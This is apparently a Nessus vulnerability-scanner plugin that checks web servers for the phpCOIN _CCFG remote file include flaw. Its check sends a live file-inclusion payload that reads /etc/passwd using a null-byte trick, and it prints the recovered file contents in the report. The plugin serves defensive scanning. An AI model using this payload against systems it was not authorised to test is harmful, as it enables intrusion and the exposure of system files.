#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is affected by
multiple remote file include issues. 

Description :

The remote host is running phpCOIN, a software package for web-hosting
resellers to handle clients, orders, helpdesk queries, and the like. 

The version of phpCOIN installed on the remote host fails to sanitize
input to the '_CCFG' array parameter before using it in several
scripts to include PHP code.  Provided PHP's 'register_globals'
setting is enabled, an unauthenticated attacker may be able to exploit
these flaws to view arbitrary files on the remote host or to execute
arbitrary PHP code, possibly taken from third-party hosts. 

See also :

http://milw0rm.com/exploits/2254
http://forums.phpcoin.com//index.php?showtopic=3

Solution :

Patch the 'coin_includes/session_set.php' file as described in the
vendor advisory referenced above. 

Risk factor :

Medium / CVSS Base Score : 6 
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";


if (description)
{
  script_id(22267);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2006-4424", "CVE-2006-4425");
  script_bugtraq_id(19706);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"28218");
    script_xref(name:"OSVDB", value:"28219");
    script_xref(name:"OSVDB", value:"28220");
    script_xref(name:"OSVDB", value:"28221");
    script_xref(name:"OSVDB", value:"28222");
    script_xref(name:"OSVDB", value:"28223");
    script_xref(name:"OSVDB", value:"28224");
    script_xref(name:"OSVDB", value:"28225");
  }

  script_name(english:"phpCOIN _CCFG Parameter Remote File Include Vulnerability");
  script_summary(english:"Tries to read a local file with phpCOIN");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/phpcoin", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the flaw to read a file.
  file = "/etc/passwd%00";
  req = http_get(
    item:string(
      dir, "/coin_includes/constants.php?",
      "_CCFG[_PKG_PATH_INCL]=", file
    ),
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # it sets the phpCOIN cookie and...
    "phpcoinsessid=" >< res &&
    (
    # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error saying "failed to open stream".
      egrep(pattern:"main\(/etc/passwd\\0core\.php.+ failed to open stream", string:res) ||
      # we get an error claiming the file doesn't exist or...
      egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
      # we get an error about open_basedir restriction.
      egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
    )
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
    {
      res = res - strstr(res, "<br");

      # Skip HTTP response headers.
      contents = "";
      in_headers = 1;
      foreach line (split(res, keep:FALSE))
      {
        if (strlen(line) == 0) in_headers = 0;
        else if (!in_headers) contents += line + '\n';
      }
    }

    if (contents && report_verbosity)
      report = string(
        desc,
        "\n\n",
       "Plugin output :\n",
        "\n",
        "Here are the repeated contents of the file '/etc/passwd' that\n",
        "Nessus was able to read from the remote host :\n",
        "\n",
        contents
      );
    else report = desc;

    security_warning(port:port, data:report);
    exit(0);
  }
}
